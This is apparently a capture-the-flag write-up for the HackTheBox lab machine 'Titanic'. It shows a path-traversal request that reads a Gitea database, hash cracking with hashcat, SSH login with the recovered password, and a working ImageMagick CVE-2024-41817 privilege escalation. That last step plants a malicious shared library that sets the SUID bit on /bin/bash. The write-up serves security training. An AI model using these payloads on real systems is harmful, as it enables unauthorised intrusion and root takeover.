---
title: "Titanic"
date: 2025-06-21
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Titanic

![](../assets/Pasted%20image%2020250604002453.png)

<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 23:39 CEST
Nmap scan report for 10.10.11.55
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 5.0 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   41.22 ms 10.10.14.1
2   41.60 ms 10.10.11.55

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.31 seconds
```

Add `titanic.htb` to `/etc/hosts`.

The site shows a service to book Titanic trips.

![](../assets/Pasted%20image%2020250604004538.png)

Use `wfuzz` to enumerate subdomains and find `dev`.

```shell
$ wfuzz -c -t 200 --hh 154 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.titanic.htb" http://titanic.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://titanic.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================
000000019:   200        275 L    1278 W     13870 Ch    "dev"                                 
```

Add `dev.titanic.htb` to `/etc/hosts` and browse the site.

![](../assets/Pasted%20image%2020250604004742.png)

It's a Gitea instance in which we can register.

Log in with the new account and check the repos to find some data.

The Docker Compose for `MySQL` with credentials, another one for Gitea, and the app code from before.

![](../assets/Pasted%20image%2020250602234840.png)

![](../assets/Pasted%20image%2020250604010747.png)

![](../assets/Pasted%20image%2020250604010124.png)

## Initial Access

We can see at the `/download` endpoint that there is no path traversal protection, so we can make a request and perform an LFI attack pointing to the Gitea database at `/home/developer/gitea/data/gitea/gitea.db` as seen in the Docker Compose and the Gitea docs (`gitea/gitea.db`).
`/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db`

![](../assets/Pasted%20image%2020250604011004.png)

The hash and salt are in hex format; we need them in `base64` to feed them to hashcat as seen [here](https://hashcat.net/wiki/doku.php?id=example_hashes):

![](../assets/Pasted%20image%2020250604011501.png)

hash: `e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`
salt: `8bf3e3452b78544f8bee9400d6936d34`

Use `xxd` to convert it from hex to binary and then `base64` to encode it.

```shell
$ echo 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56' | xxd -p -r | base64
5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=

$ echo '8bf3e3452b78544f8bee9400d6936d34' | xxd -p -r | base64
i/PjRSt4VE+L7pQA1pNtNA==
```

`sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=`

```shell
$ sudo hashcat hash SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force -d 2
hashcat (v6.2.6) starting in autodetect mode

The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Dictionary cache hit:
* Filename..: SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
* Passwords.: 14344383
* Bytes.....: 53291283
* Keyspace..: 14344383

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

`developer:25282528`

Log into the machine via `ssh`:

```shell
$ ssh developer@titanic.htb
developer@titanic.htb password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Jun  3 09:55:33 PM UTC 2025

  System load:           0.78
  Usage of /:            83.1% of 6.79GB
  Memory usage:          23%
 
Last login: Tue Jun 3 00:17:16 2025 from 10.10.14.8
developer@titanic:~$ cd /opt
developer@titanic:/opt$ whoami
developer
```

Get the flag:

```shell
developer@titanic:~$ cat user.txt
c7158d122d55f4fa53de64dd03ca2085
```

## Privilege Escalation

A script in `/opt/scripts` that uses `magick` does some processing on images.

```shell
developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

We can check the version:

```shell
developer@titanic:/opt/scripts$ /usr/bin/magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
```

Looking for vulnerabilities, we find [CVE-2024-41817](https://www.fortiguard.com/encyclopedia/endpoint-vuln/81352#), which we can use to escalate privileges.

- [FortiGuard CVE-2024-41817](https://www.fortiguard.com/encyclopedia/endpoint-vuln/81352#)
- [Mindpatch writeup](https://mindpatch.medium.com/cve-2024-41817-how-env-var-triggers-rce-in-imagemagicks-appimage-14d54aba5613)

Create the shared library and place it in the working directory `/opt/app/static/assets/images`:

```shell
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
__attribute__((constructor)) void init(){  
    system("chmod +s /bin/bash");  
    exit(0);  
}  
EOF
```

A root cron job will execute it.

![](../assets/Pasted%20image%2020250604012917.png)

## Post Exploitation

Get the flag:

```shell
bash-5.1# cat root.txt
aa8be85cd77b9e27a344d1c68ec01f3f
```
